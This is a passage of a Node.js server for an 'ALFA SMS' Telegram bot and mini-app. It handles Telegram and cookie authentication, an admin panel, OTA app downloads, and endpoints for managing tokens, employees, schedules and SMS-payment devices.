      // «Подтвердить» a payment: the device sends its deferred «Ок».
      if (data.startsWith('cf:')) {
        const d = db.devices.find((x) => x.id === data.slice(3));
        const t = d && db.tokens.find((x) => x.id === d.tokenId);
        if (!d || !t || !tokenMembers(t).includes(fromId)) return tgAnswerCallback(cq.id, 'Недоступно');
        d.confirmReq = uuid();
        bumpDevice(d);
        saveDb();
        return tgAnswerCallback(cq.id, 'Отправляю подтверждение…');
      }
      if (data.startsWith('rw:')) {
        const t = db.tokens.find((x) => x.id === data.slice(3));
        if (!t || String(t.telegramId) !== fromId) return tgAnswerCallback(cq.id, 'Недоступно');
        await tgAnswerCallback(cq.id);
        await tgSend(fromId,
          '❓ Настроить <b>доработку</b> автоматически?\n\nСистема удалит уже исполненные платежи со всех ваших устройств и оставит только неисполненные.',
          [[{ text: '✅ Да, настроить автоматически', callback_data: `rwc:${t.id}` }]]);
        return;
      }
      if (data.startsWith('rwc:')) {
        const t = db.tokens.find((x) => x.id === data.slice(4));
        if (!t || String(t.telegramId) !== fromId) return tgAnswerCallback(cq.id, 'Недоступно');
        reworkToken(t);
        await tgAnswerCallback(cq.id, 'Готово');
        await tgSend(fromId, '✅ <b>Всё настроено.</b>\n\nОткройте мини‑апп и настройте расписание для начала работы.');
        return;
      }
      return tgAnswerCallback(cq.id);
    }
    if (update.message && update.message.text) {
      const chatId = update.message.chat.id;
      const text = String(update.message.text).trim();
      if (text.startsWith('/start')) {
        await tgSend(chatId,
          '👋 <b>ALFA SMS</b>\n\nНажмите кнопку меню снизу, чтобы открыть панель управления устройствами.');
      }
    }
  } catch (e) {
    console.error('handleTelegramUpdate error:', e.message);
  }
}

function readRawBody(req, maxBytes) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    let size = 0;
    req.on('data', (c) => { size += c.length; if (size > maxBytes) { req.destroy(); reject(new Error('too_large')); return; } chunks.push(c); });
    req.on('end', () => resolve(Buffer.concat(chunks)));
    req.on('error', reject);
  });
}

// ---------------------------------------------------------------------------
// Public views for the mini-app
// ---------------------------------------------------------------------------

function pairingQrPayload(code) {
  return `alfasms://pair?u=${encodeURIComponent(PUBLIC_BASE_URL)}&c=${encodeURIComponent(code)}`;
}
function pendingPairing(d) {
  if (d.pairedAt || !d.pairing || now() >= d.pairing.expiresAt) return null;
  return { code: d.pairing.code, expiresAt: d.pairing.expiresAt, qr: pairingQrPayload(d.pairing.code) };
}
function deviceView(d) {
  const online = d.lastSeen && (now() - d.lastSeen < SYNC_INTERVAL_MS * 3);
  return {
    id: d.id, name: d.name, active: !!d.active, paired: !!d.pairedAt,
    online: !!online, lastSeen: d.lastSeen || 0, hardwareModel: d.hardwareModel || '',
    payments: d.payments || [], status: d.status || {}, pairing: pendingPairing(d),
  };
}
// Concise dashboard summary: device connectivity + today's successful payments.
function computeDashboard(t) {
  const devs = tokenDevices(t.id);
  const nowMs = now();
  const ONLINE_MS = SYNC_INTERVAL_MS * 3; // ~45s: a live device syncs well within this
  // Connectivity is only meaningful for active devices (inactive ones don't work).
  let active = 0, online = 0;
  const offlineNames = [];
  for (const d of devs) {
    if (!d.active) continue;
    active++;
    const on = !!(d.lastSeen && (nowMs - d.lastSeen) < ONLINE_MS);
    if (on) online++; else offlineNames.push(d.name || '—');
  }
  // Start of today in the server's timezone (TZ env = users' timezone, MSK).
  const sd = new Date(); sd.setHours(0, 0, 0, 0);
  const startToday = sd.getTime();
  let count = 0, sum = 0;
  for (const p of (db.paymentsLog || [])) {
    if (p.tokenId !== t.id || p.at < startToday) continue;
    count++; sum += parseFloat(String(p.amount).replace(',', '.')) || 0;
  }
  return {
    working: !!t.globalOn,
    signalEnabled: !!t.signalEnabled,
    mode: t.workMode || 'manual',
    devices: { total: devs.length, active, online, offline: Math.max(0, active - online) },
    offlineNames: offlineNames.slice(0, 8),
    today: { count, sum },
  };
}

function tokenStateView(t, viewerId) {
  const devices = tokenDevices(t.id);
  const owner = isOwner(t, viewerId);
  const view = {
    comment: t.comment || '',
    expiresAt: t.expiresAt || 0,
    expired: !!(t.expiresAt && now() >= t.expiresAt),
    enabled: !!t.enabled,
    valid: tokenValid(t),
    deviceLimit: t.deviceLimit || 0,
    deviceCount: devices.length,
    canAddDevice: tokenValid(t) && devices.length < (t.deviceLimit || 0),
    globalOn: !!t.globalOn,
    workMode: t.workMode || 'manual',
    // The "Начать немедленную работу" toggle reflects ONLY user-started manual
    // work — not signal / schedule sessions (which also set globalOn).
    manualOn: !!t.globalOn && (t.workMode || 'manual') === 'manual',
    signalEnabled: !!t.signalEnabled,
    // Gate for the "Метод Форс" screen: the mini-app only shows the feature when
    // the admin has switched it on for this token.
    metodForsEnabled: !!t.metodForsEnabled,
    // «Автоматическое подтверждение» — default ON. OFF ⇒ device won't auto-reply
    // «Ок» to «символ»; the owner confirms each payment from the bot.
    autoConfirm: t.autoConfirm !== false,
    schedule: t.schedule || defaultSchedule(),
    recipientNumber: RECIPIENT_NUMBER,
    isOwner: owner,
    devices: devices.map(deviceView),
    dash: computeDashboard(t),
  };
  // Only the owner sees / manages the employee list.
  if (owner) {
    view.employees = (t.employees || []).map((e) => ({ telegramId: String(e.telegramId), name: e.name || '', addedAt: e.addedAt || 0 }));
    view.invites = (t.employeeInvites || []).filter((i) => now() < i.expiresAt).map((i) => ({ code: i.code, expiresAt: i.expiresAt }));
  }
  return view;
}

// ---------------------------------------------------------------------------
// Telegram auth
// ---------------------------------------------------------------------------

function verifyTelegramInitData(initData) {
  if (!initData || !TELEGRAM_BOT_TOKEN) return null;
  try {
    const params = new URLSearchParams(initData);
    const hash = params.get('hash');
    if (!hash) return null;
    params.delete('hash');
    const pairs = [];
    for (const [k, v] of params) pairs.push(`${k}=${v}`);
    pairs.sort();
    const dataCheckString = pairs.join('\n');
    const secretKey = crypto.createHmac('sha256', 'WebAppData').update(TELEGRAM_BOT_TOKEN).digest();
    const computed = crypto.createHmac('sha256', secretKey).update(dataCheckString).digest('hex');
    if (!safeEqual(computed, hash)) return null;
    const user = params.get('user') ? JSON.parse(params.get('user')) : null;
    if (!user || !user.id) return null;
    return { telegramId: String(user.id), user };
  } catch (e) { return null; }
}
// Verifies a Telegram Login Widget payload (different scheme than WebApp
// initData: secret key is sha256(bot_token), fields joined as key=value\n).
function verifyTelegramLogin(data) {
  if (!data || !TELEGRAM_BOT_TOKEN || !data.hash || !data.id) return null;
  try {
    const hash = String(data.hash);
    const pairs = [];
    for (const k of Object.keys(data)) {
      if (k === 'hash' || data[k] == null) continue;
      pairs.push(`${k}=${data[k]}`);
    }
    pairs.sort();
    const dataCheckString = pairs.join('\n');
    const secretKey = crypto.createHash('sha256').update(TELEGRAM_BOT_TOKEN).digest();
    const computed = crypto.createHmac('sha256', secretKey).update(dataCheckString).digest('hex');
    if (!safeEqual(computed, hash)) return null;
    if (data.auth_date && (Date.now() / 1000 - Number(data.auth_date)) > 86400) return null;
    return { id: String(data.id) };
  } catch (e) { return null; }
}

// --- Desktop web session (signed cookie) ---
function parseCookies(req) {
  const out = {};
  const h = req.headers.cookie || '';
  for (const part of h.split(';')) {
    const i = part.indexOf('=');
    if (i > 0) out[part.slice(0, i).trim()] = decodeURIComponent(part.slice(i + 1).trim());
  }
  return out;
}
function signSession(payload) {
  const body = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const sig = crypto.createHmac('sha256', SESSION_SECRET).update(body).digest('base64url');
  return `${body}.${sig}`;
}
function readSession(req) {
  const raw = parseCookies(req)['alfa_sess'];
  if (!raw) return null;
  const i = raw.lastIndexOf('.');
  if (i < 0) return null;
  const body = raw.slice(0, i), sig = raw.slice(i + 1);
  const expect = crypto.createHmac('sha256', SESSION_SECRET).update(body).digest('base64url');
  if (!safeEqual(sig, expect)) return null;
  try {
    const p = JSON.parse(Buffer.from(body, 'base64url').toString('utf8'));
    if (p.exp && Date.now() > p.exp) return null;
    return p;
  } catch (e) { return null; }
}
function setSessionCookie(res, payload) {
  const val = encodeURIComponent(signSession(payload));
  res.setHeader('Set-Cookie',
    `alfa_sess=${val}; Path=/; HttpOnly; SameSite=Lax; Secure; Max-Age=${Math.floor(SESSION_TTL_MS / 1000)}`);
}
function clearSessionCookie(res) {
  res.setHeader('Set-Cookie', 'alfa_sess=; Path=/; HttpOnly; SameSite=Lax; Secure; Max-Age=0');
}

// The real identity of the caller (Telegram initData, web session, or dev).
function baseTelegramId(req) {
  const verified = verifyTelegramInitData(req.headers['x-init-data'] || '');
  if (verified) return verified.telegramId;
  // Desktop browser session (token or Telegram login).
  const sess = readSession(req);
  if (sess) {
    if (sess.k === 'tg' && sess.id) return String(sess.id);
    if (sess.k === 'tok' && sess.tid) return 'tok:' + sess.tid;
  }
  if (!TELEGRAM_BOT_TOKEN) {
    const dbg = req.headers['x-debug-tg-id'];
    return dbg ? String(dbg) : 'dev-user';
  }
  return null;
}
// The effective identity. The admin may "enter" any token's cabinet by sending
// X-Act-As-Token: <tokenId>; we then resolve to that token's owner identity so
// every mini-app endpoint edits that token as if the admin were its owner.
function resolveTelegramId(req) {
  const base = baseTelegramId(req);
  const act = req.headers['x-act-as-token'];
  if (act && String(base) === ADMIN_TG_ID) {
    const t = db.tokens.find((x) => x.id === String(act));
    if (t) return 'tok:' + t.id;
  }
  return base;
}
// Admin gate must use the REAL identity, never the impersonated one.
function isAdminId(req) { return String(baseTelegramId(req)) === ADMIN_TG_ID; }
function isAdminReq(req) {
  // Use the real identity so an impersonation header can't affect admin gating.
  return isAdminId(req);
}

// ---------------------------------------------------------------------------
// Legacy password admin panel (HTML)
// ---------------------------------------------------------------------------

function checkAdminAuth(req) {
  const header = req.headers['authorization'] || '';
  if (!header.startsWith('Basic ')) return false;
  let decoded;
  try { decoded = Buffer.from(header.slice(6), 'base64').toString('utf8'); } catch (e) { return false; }
  const idx = decoded.indexOf(':');
  return safeEqual(decoded.slice(0, idx), ADMIN_USER) && safeEqual(decoded.slice(idx + 1), ADMIN_PASSWORD);
}
function requireAdmin(req, res) {
  if (checkAdminAuth(req)) return true;
  res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="admin", charset="UTF-8"', 'Content-Type': 'text/plain; charset=utf-8' });
  res.end('Требуется авторизация');
  return false;
}
function parseForm(body) {
  const params = new URLSearchParams(body);
  const obj = {};
  for (const [k, v] of params) obj[k] = v;
  return obj;
}
function renderAdmin() {
  const rows = db.tokens.map((t) => {
    const devices = tokenDevices(t.id);
    const status = t.enabled ? '<span class="ok">включён</span>' : '<span class="bad">выключен</span>';
    const exp = t.expiresAt
      ? (now() >= t.expiresAt ? `<span class="bad">истёк ${fmtDate(t.expiresAt)}</span>` : `до ${fmtDate(t.expiresAt)}`)
      : 'бессрочно';
    return `<tr>
      <td><code>${esc(t.value)}</code></td><td>${esc(t.comment || '')}</td>
      <td>${status}${t.globalOn ? ' <span class="work">▶</span>' : ''}</td><td>${exp}</td>
      <td>${devices.length} / ${t.deviceLimit || 0}</td>
      <td>${t.telegramId ? esc(String(t.telegramId)) : '—'}</td><td>${fmtTime(t.createdAt)}</td>
      <td class="actions">
        <form method="POST" action="/admin/quota"><input type="hidden" name="id" value="${esc(t.id)}"><input type="number" name="deviceLimit" value="${t.deviceLimit || 0}" min="0" style="width:60px"><button>Устр.</button></form>
        <form method="POST" action="/admin/extend"><input type="hidden" name="id" value="${esc(t.id)}"><input type="number" name="days" value="30" style="width:60px"><button>Дней</button></form>
        <form method="POST" action="/admin/toggle"><input type="hidden" name="id" value="${esc(t.id)}"><button>${t.enabled ? 'Выкл' : 'Вкл'}</button></form>
        <form method="POST" action="/admin/delete" onsubmit="return confirm('Удалить токен и устройства?')"><input type="hidden" name="id" value="${esc(t.id)}"><button class="danger">Удалить</button></form>
      </td></tr>`;
  }).join('');
  return `<!doctype html><html lang="ru"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>ALFA SMS — админка</title>
<style>body{font-family:system-ui,sans-serif;margin:24px;color:#202124}table{border-collapse:collapse;width:100%;margin-top:16px}th,td{border:1px solid #dadce0;padding:8px;font-size:13px;text-align:left}th{background:#f1f3f4}code{background:#f1f3f4;padding:2px 4px;border-radius:4px}button{cursor:pointer;padding:4px 8px}.danger{color:#c5221f}.ok{color:#137333;font-weight:600}.bad{color:#c5221f;font-weight:600}.work{color:#1a73e8}form.create{margin-top:8px;display:flex;gap:8px;flex-wrap:wrap;align-items:center}td.actions form{display:inline-flex;gap:3px;margin:1px}</style></head><body>
<h1>ALFA SMS — токены</h1>
<form class="create" method="POST" action="/admin/create"><input type="text" name="comment" placeholder="Комментарий" required><label>Дней:<input type="number" name="days" value="30" min="0" style="width:70px"></label><label>Устройств:<input type="number" name="deviceLimit" value="1" min="0" style="width:70px"></label><button>Создать токен</button></form>
<table><thead><tr><th>Токен</th><th>Комментарий</th><th>Статус</th><th>Срок</th><th>Устр.</th><th>Telegram</th><th>Создан</th><th>Действия</th></tr></thead>
<tbody>${rows || '<tr><td colspan="8">Пусто</td></tr>'}</tbody></table>
<p style="color:#5f6368;font-size:13px;margin-top:20px">Основная админка — в мини‑аппе (для Telegram ID ${esc(ADMIN_TG_ID)}). Эта страница — резервный доступ по паролю.</p>
</body></html>`;
}

// ---------------------------------------------------------------------------
// Routing helpers
// ---------------------------------------------------------------------------

function serveStatic(res, file, contentType, noCache) {
  fs.readFile(file, (err, buf) => {
    if (err) { res.writeHead(404); return res.end('Not found'); }
    const headers = { 'Content-Type': contentType };
    // The mini-app HTML must never be cached, or Telegram keeps serving an old
    // build after a deploy. Force a fresh fetch every open.
    if (noCache) {
      headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0';
      headers['Pragma'] = 'no-cache';
      headers['Expires'] = '0';
    }
    res.writeHead(200, headers);
    res.end(buf);
  });
}
function miniRequireToken(req, res) {
  const tgId = resolveTelegramId(req);
  if (!tgId) { sendJson(res, 401, { error: 'no_telegram_identity' }); return null; }
  const t = findTokenByTelegram(tgId);
  if (!t) { sendJson(res, 428, { error: 'need_token' }); return null; }
  return t;
}
function miniDevice(t, id) { return db.devices.find((d) => d.id === id && d.tokenId === t.id); }

function adminTokenSummary(t) {
  const devices = tokenDevices(t.id);
  return {
    id: t.id, value: t.value, comment: t.comment || '', enabled: !!t.enabled,
    expiresAt: t.expiresAt || 0, expired: !!(t.expiresAt && now() >= t.expiresAt),
    deviceLimit: t.deviceLimit || 0, deviceCount: devices.length,
    pairedCount: devices.filter((d) => d.pairedAt).length,
    activeCount: devices.filter((d) => d.active).length,
    telegramId: t.telegramId ? String(t.telegramId) : '',
    globalOn: !!t.globalOn, createdAt: t.createdAt || 0,
    metodForsEnabled: !!t.metodForsEnabled,
    schedule: t.schedule || defaultSchedule(),
    devices: devices.map((d) => ({
      id: d.id, name: d.name, active: !!d.active, paired: !!d.pairedAt,
      lastSeen: d.lastSeen || 0,
      appVersionCode: (d.status && d.status.appVersionCode) || 0,
      payments: (d.payments || []).map((p) => ({
        name: p.name, requisites: p.requisites, amount: p.amount,
        multiple: !!p.multiple, count: p.multiple ? p.count : 1,
      })),
    })),
  };
}

// ---------------------------------------------------------------------------
// Server
// ---------------------------------------------------------------------------

const db = loadDb();

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const p = url.pathname;
  const m = req.method;

  try {
    // ================= Telegram webhook =================
    if (WEBHOOK_SECRET && m === 'POST' && p === `/bot/${WEBHOOK_SECRET}`) {
      if ((req.headers['x-telegram-bot-api-secret-token'] || '') !== WEBHOOK_SECRET) {
        res.writeHead(403); return res.end('forbidden');
      }
      const update = await readJson(req);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end('{"ok":true}');
      if (update) handleTelegramUpdate(update);
      return;
    }

    // ================= "Signal" webhook (MacroDroid) =================
    // Hit when a "символ" signal SMS arrives on the monitoring phone. Starts
    // work for every user who opted in via the "Отработать по сигналу" switch.
    if (p === `/api/signal/${SIGNAL_SECRET}` && (m === 'POST' || m === 'GET')) {
      const r = fireSignal('webhook');
      saveDb();
      return sendJson(res, 200, { ok: true, started: r.started, skipped: r.skipped });
    }

    // ================= Precise time source (public) =================
    // The device clock-syncs to this NTP-backed wall clock so "Метод Форс" hits
    // xx:59:58 Moscow time exactly, even if the phone's clock drifts.
    // Moscow is UTC+3 with no DST, so mskMs = now + 3h independent of any device TZ.
    if (p === '/api/time' && m === 'GET') {
      const nowMs = Date.now();
      return sendJson(res, 200, { now: nowMs, mskOffsetMs: 3 * 3600 * 1000, mskMs: nowMs + 3 * 3600 * 1000 });
    }

    // ================= App updates (OTA, public) =================
    if (p === '/app/version.json' && m === 'GET') {
      return sendJson(res, 200, readUpdateInfo());
    }
    if (p === '/app/alfa-sms.apk' && m === 'GET') {
      if (!fs.existsSync(APK_FILE)) { res.writeHead(404, { 'Content-Type': 'text/plain' }); return res.end('No APK published'); }
      const stat = fs.statSync(APK_FILE);
      res.writeHead(200, {
        'Content-Type': 'application/vnd.android.package-archive',
        'Content-Length': stat.size,
        'Content-Disposition': 'attachment; filename="alfa-sms.apk"',
      });
      return fs.createReadStream(APK_FILE).pipe(res);
    }

    // ================= Desktop web login (browser, no Telegram WebApp) =========
    // Config for the "Log in with Telegram" widget.
    if (p === '/api/web/config' && m === 'GET') {
      return sendJson(res, 200, { botUsername: BOT_USERNAME, hasBot: !!TELEGRAM_BOT_TOKEN });
    }
    // Log in by token value → owner-level web session.
    if (p === '/api/web/login/token' && m === 'POST') {
      const body = await readJson(req);
      const value = String((body && body.token) || '').trim().toUpperCase();
      const t = findTokenByValue(value);
      if (!t) return sendJson(res, 404, { error: 'invalid_token' });
      if (!t.enabled) return sendJson(res, 403, { error: 'disabled' });
      if (!tokenValid(t)) return sendJson(res, 403, { error: 'expired' });
      setSessionCookie(res, { k: 'tok', tid: t.id, exp: Date.now() + SESSION_TTL_MS });
      return sendJson(res, 200, { ok: true });
    }
    // Log in with Telegram (Login Widget payload) → Telegram-id web session.
    if (p === '/api/web/login/telegram' && m === 'POST') {
      const body = await readJson(req);
      const data = body && body.user ? body.user : body;
      const v = verifyTelegramLogin(data);
      if (!v) return sendJson(res, 403, { error: 'bad_signature' });
      setSessionCookie(res, { k: 'tg', id: v.id, exp: Date.now() + SESSION_TTL_MS });
      return sendJson(res, 200, { ok: true });
    }
    if (p === '/api/web/logout' && m === 'POST') {
      clearSessionCookie(res);
      return sendJson(res, 200, { ok: true });
    }

    // ================= Mini-app: session/state =================
    if (p === '/api/mini/state' && m === 'GET') {
      const tgId = resolveTelegramId(req);
      if (!tgId) return sendJson(res, 401, { error: 'no_telegram_identity' });
      const admin = isAdminId(req); // real identity — stays true while impersonating
      const acting = admin && !!req.headers['x-act-as-token'];
      const t = findTokenByTelegram(tgId);
      if (!t) return sendJson(res, 200, { needToken: true, isAdmin: admin, acting });
      return sendJson(res, 200, { needToken: false, isAdmin: admin, acting,
        actingComment: acting ? (t.comment || t.value) : undefined,
        state: tokenStateView(t, tgId) });
    }

    if (p === '/api/mini/bind' && m === 'POST') {
      const tgId = resolveTelegramId(req);
      if (!tgId) return sendJson(res, 401, { error: 'no_telegram_identity' });
      const body = await readJson(req);
      if (!body) return sendJson(res, 400, { error: 'bad_json' });
      const value = String(body.token || '').trim().toUpperCase();

      // 1) Token value → become the OWNER (first) or reconnect an existing member.
      const t = findTokenByValue(value);
      if (t) {
        if (!t.enabled) return sendJson(res, 403, { error: 'disabled' });
        if (t.expiresAt && now() >= t.expiresAt) return sendJson(res, 403, { error: 'expired' });
        if (t.telegramId && String(t.telegramId) !== String(tgId) &&
            !(t.employees || []).some((e) => String(e.telegramId) === String(tgId))) {
          // Someone else already owns this token; employees join via invite code.
          return sendJson(res, 409, { error: 'bound_elsewhere' });
        }
        if (!t.telegramId) { detachIdentity(tgId); t.telegramId = String(tgId); } // first → owner
        saveDb();
        return sendJson(res, 200, { state: tokenStateView(t, tgId), isAdmin: String(tgId) === ADMIN_TG_ID });
      }

      // 2) Employee invite code → join an existing token as an employee.
      const host = db.tokens.find((x) => (x.employeeInvites || []).some((i) => i.code === value && now() < i.expiresAt));
      if (host) {
        if (!tokenValid(host)) return sendJson(res, 403, { error: 'disabled' });
        detachIdentity(tgId);
        host.employees = host.employees || [];
        if (!host.employees.some((e) => String(e.telegramId) === String(tgId))) {
          host.employees.push({ telegramId: String(tgId), name: '', addedAt: now() });
        }
        host.employeeInvites = (host.employeeInvites || []).filter((i) => i.code !== value); // consume
        saveDb();
        return sendJson(res, 200, { state: tokenStateView(host, tgId), isAdmin: String(tgId) === ADMIN_TG_ID });
      }

      return sendJson(res, 404, { error: 'invalid_token' });
    }

    // ================= Admin API (Telegram-id gated) =================
    if (p.startsWith('/api/admin/')) {
      if (!isAdminReq(req)) return sendJson(res, 403, { error: 'forbidden' });

      if (p === '/api/admin/tokens' && m === 'GET') {
        const probeCount = db.devices.filter((d) => probeEligible(d, db.tokens.find((t) => t.id === d.tokenId))).length;
        return sendJson(res, 200, {
          adminTgId: ADMIN_TG_ID,
          totals: { tokens: db.tokens.length, devices: db.devices.length },
          settings: { probeEnabled: !!(db.settings && db.settings.probeEnabled), probeEligible: probeCount },
          latestVersionCode: readUpdateInfo().versionCode || 0,
          tokens: db.tokens.map(adminTokenSummary),
        });
      }

      // Toggle the probe pool on/off (system-wide).
      if (p === '/api/admin/probe' && m === 'POST') {
        const body = await readJson(req);
        db.settings = db.settings || {};
        db.settings.probeEnabled = Boolean(body && body.enabled);
        saveDb();
        return sendJson(res, 200, { ok: true, probeEnabled: db.settings.probeEnabled });
      }

      // Summary of all successful ("успешно") payments across all users.
      if (p === '/api/admin/payments' && m === 'GET') {
        const log = db.paymentsLog || [];
        const total = { count: log.length, sum: log.reduce((s, x) => s + amountValue(x.amount), 0) };
        const byMap = {};
        for (const x of log) {
          const k = x.tokenId || '?';
          if (!byMap[k]) byMap[k] = { tokenId: k, comment: x.tokenComment || '', count: 0, sum: 0 };
          byMap[k].count++; byMap[k].sum += amountValue(x.amount);
        }
        const byToken = Object.values(byMap).sort((a, b) => b.sum - a.sum);
        const recent = log.slice(-200).reverse().map((x) => ({
          deviceName: x.deviceName, requisites: x.requisites, amount: x.amount,
          at: x.at, tokenComment: x.tokenComment,
        }));
        return sendJson(res, 200, { total, byToken, recent });
      }

      // Log of "символ" signal webhook hits (MacroDroid), most recent first.
      if (p === '/api/admin/signals' && m === 'GET') {
        const log = db.signalLog || [];
        const recent = log.slice(-200).reverse();
        return sendJson(res, 200, { total: log.length, recent });
      }

      // Log of automatic session stops (every participating device reported
      // done) — "почему само остановилось" without guessing from a live poll.
      if (p === '/api/admin/stops' && m === 'GET') {
        const log = db.stopLog || [];
        const recent = log.slice(-200).reverse();
        return sendJson(res, 200, { total: log.length, recent });
      }
      if (p === '/api/admin/token' && m === 'POST') {
        const body = await readJson(req);
        const days = parseInt(body && body.days, 10);
        const deviceLimit = Math.max(0, parseInt(body && body.deviceLimit, 10) || 0);
        const t = {
          id: uuid(), value: newTokenValue(), comment: String((body && body.comment) || '').slice(0, 200),
          enabled: true, createdAt: now(),
          expiresAt: Number.isFinite(days) && days > 0 ? now() + days * 86400000 : 0,
          deviceLimit, telegramId: null, employees: [], employeeInvites: [], globalOn: false, signalEnabled: false, metodForsEnabled: false, workSession: '', schedule: defaultSchedule(), rev: 0,
        };
        db.tokens.push(t);
        saveDb();
        return sendJson(res, 200, { token: adminTokenSummary(t) });
      }
      const am = p.match(/^\/api\/admin\/token\/([^/]+)(?:\/(\w+))?$/);
      if (am) {
        const t = db.tokens.find((x) => x.id === am[1]);
        if (!t) return sendJson(res, 404, { error: 'not_found' });
        const action = am[2] || '';
        if (m === 'DELETE' && !action) {
          db.tokens = db.tokens.filter((x) => x.id !== t.id);
          db.devices = db.devices.filter((x) => x.tokenId !== t.id);
          saveDb();
          return sendJson(res, 200, { ok: true });
        }
        if (m === 'POST' && action === 'quota') {
          const body = await readJson(req);
          t.deviceLimit = Math.max(0, parseInt(body && body.deviceLimit, 10) || 0);
          saveDb();
          return sendJson(res, 200, { token: adminTokenSummary(t) });
        }
        if (m === 'POST' && action === 'extend') {
          const body = await readJson(req);
          const days = parseInt(body && body.days, 10);
          t.expiresAt = Number.isFinite(days) && days > 0 ? now() + days * 86400000 : 0;
          bumpToken(t);
          saveDb();
          return sendJson(res, 200, { token: adminTokenSummary(t) });
        }
        if (m === 'POST' && action === 'toggle') {
          t.enabled = !t.enabled;
          bumpToken(t);
          saveDb();
          return sendJson(res, 200, { token: adminTokenSummary(t) });
        }
        if (m === 'POST' && action === 'unbind') {
          t.telegramId = null;
          saveDb();
          return sendJson(res, 200, { token: adminTokenSummary(t) });
        }
        // Grant / revoke the "Метод Форс" feature for this token.
        if (m === 'POST' && action === 'metodfors') {
          const body = await readJson(req);
          t.metodForsEnabled = (body && typeof body.enabled === 'boolean') ? body.enabled : !t.metodForsEnabled;
          bumpToken(t); // push the new capability to the token's devices at once
          saveDb();
          return sendJson(res, 200, { token: adminTokenSummary(t) });
        }
        return sendJson(res, 405, { error: 'method_not_allowed' });
      }
      return sendJson(res, 404, { error: 'not_found' });
    }

    // ================= Mini-app: authenticated endpoints =================
    if (p.startsWith('/api/mini/')) {
      const t = miniRequireToken(req, res);
      if (!t) return;
      const viewer = resolveTelegramId(req);

      // ---- Employees (owner only) ----
      if (p.startsWith('/api/mini/employee')) {
        if (!isOwner(t, viewer)) return sendJson(res, 403, { error: 'not_owner' });

        if (p === '/api/mini/employee/invite' && m === 'POST') {
          t.employeeInvites = (t.employeeInvites || []).filter((i) => now() < i.expiresAt);
          const invite = { code: newInviteCode(), createdAt: now(), expiresAt: now() + 7 * 24 * 60 * 60 * 1000 };
          t.employeeInvites.push(invite);
          saveDb();
          return sendJson(res, 200, { invite, state: tokenStateView(t, viewer) });
        }
        const mInv = p.match(/^\/api\/mini\/employee\/invite\/([A-Z0-9]+)$/);
        if (mInv && m === 'DELETE') {
          t.employeeInvites = (t.employeeInvites || []).filter((i) => i.code !== mInv[1]);
          saveDb();
          return sendJson(res, 200, { state: tokenStateView(t, viewer) });
        }
        const mEmp = p.match(/^\/api\/mini\/employee\/([^/]+)$/);
        if (mEmp && m === 'DELETE') {
          t.employees = (t.employees || []).filter((e) => String(e.telegramId) !== String(mEmp[1]));
          saveDb();
          return sendJson(res, 200, { state: tokenStateView(t, viewer) });
        }
        return sendJson(res, 404, { error: 'not_found' });
      }

      if (p === '/api/mini/global' && m === 'POST') {
        if (!tokenValid(t)) return sendJson(res, 403, { error: 'token_invalid', state: tokenStateView(t, resolveTelegramId(req)) });
        const body = await readJson(req);
        const on = Boolean(body && body.on);
        const was = !!t.globalOn;
        if (on) { startSession(t, 'manual'); }
        else { t.globalOn = false; bumpToken(t); }
        saveDb();
        // Turning work OFF ends the session → send the report of what got done.
        if (was && !on) maybeSendReport(t);
        return sendJson(res, 200, { state: tokenStateView(t, resolveTelegramId(req)) });
      }

      if (p === '/api/mini/signal' && m === 'POST') {
        const body = await readJson(req);
        t.signalEnabled = Boolean(body && body.on);
        saveDb();
        return sendJson(res, 200, { state: tokenStateView(t, resolveTelegramId(req)) });
      }

      // «Автоматическое подтверждение» toggle (default ON). OFF ⇒ manual «Ок».
      if (p === '/api/mini/autoconfirm' && m === 'POST') {
        const body = await readJson(req);
        t.autoConfirm = Boolean(body && body.on);
        bumpToken(t); // push the new flag to all devices at once
        saveDb();
        return sendJson(res, 200, { state: tokenStateView(t, resolveTelegramId(req)) });
      }

      if (p === '/api/mini/schedule' && m === 'POST') {
        if (!tokenValid(t)) return sendJson(res, 403, { error: 'token_invalid', state: tokenStateView(t, resolveTelegramId(req)) });
        const body = await readJson(req);
        t.schedule = sanitizeSchedule(body && body.schedule);
        t.scheduleRuns = []; // a new schedule may run again
        bumpToken(t); // schedule applies to all devices — push to all
        saveDb();
        return sendJson(res, 200, { state: tokenStateView(t, resolveTelegramId(req)) });
      }

      if (p === '/api/mini/device' && m === 'POST') {
        if (!tokenValid(t)) return sendJson(res, 403, { error: 'token_invalid', state: tokenStateView(t, resolveTelegramId(req)) });
        const body = await readJson(req);
        const name = String((body && body.name) || '').trim().slice(0, 60) || 'Устройство';
        if (tokenDevices(t.id).length >= (t.deviceLimit || 0)) {
          return sendJson(res, 409, { error: 'quota_exceeded', state: tokenStateView(t, resolveTelegramId(req)) });
        }
        const d = {
          id: uuid(), tokenId: t.id, name, active: true, createdAt: now(),
          pairedAt: 0, hardwareId: '', hardwareModel: '', secret: '', lastSeen: 0,
          payments: [], status: {},
          pairing: { code: newPairingCode(), expiresAt: now() + PAIRING_TTL_MS }, rev: 0,
        };
        db.devices.push(d);
        saveDb();
        return sendJson(res, 200, { device: deviceView(d), state: tokenStateView(t, resolveTelegramId(req)) });
      }

      // Bulk activate / deactivate ALL devices of the token in one tap.
      if (p === '/api/mini/devices/active' && m === 'POST') {
        const body = await readJson(req);
        const on = Boolean(body && body.active);
        for (const d of tokenDevices(t.id)) {
          if (!!d.active !== on) { d.active = on; bumpDevice(d); }
        }
        saveDb();
        return sendJson(res, 200, { state: tokenStateView(t, resolveTelegramId(req)) });
      }

      const mdev = p.match(/^\/api\/mini\/device\/([^/]+)(?:\/(\w+))?$/);
      if (mdev) {
        const d = miniDevice(t, mdev[1]);
        if (!d) return sendJson(res, 404, { error: 'device_not_found' });
        const action = mdev[2] || '';

        if (m === 'DELETE' && !action) {
          db.devices = db.devices.filter((x) => x.id !== d.id);
          saveDb();
          return sendJson(res, 200, { state: tokenStateView(t, resolveTelegramId(req)) });
        }
        if (m === 'POST' && action === 'payments') {
          const body = await readJson(req);
          const clean = sanitizePayments(body && body.payments);
          const err = validatePayments(clean);
          if (err) return sendJson(res, 400, { error: err });
          d.payments = clean;
          bumpDevice(d);
          saveDb();
